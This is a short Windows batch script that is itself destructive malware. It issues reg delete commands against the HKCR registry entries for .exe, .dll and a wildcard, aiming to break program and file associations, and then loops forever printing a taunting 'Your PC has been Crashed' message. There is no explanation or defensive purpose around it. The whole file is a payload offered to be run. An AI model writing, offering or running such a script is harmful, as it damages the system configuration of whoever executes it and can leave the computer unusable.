@echo off
start reg delete HKCR/.exe
start reg delete HKCR/.dll
start reg delete HKCR/*
:message
echo So Sorry Bro!! Your PC has been Crashed..:3
goto message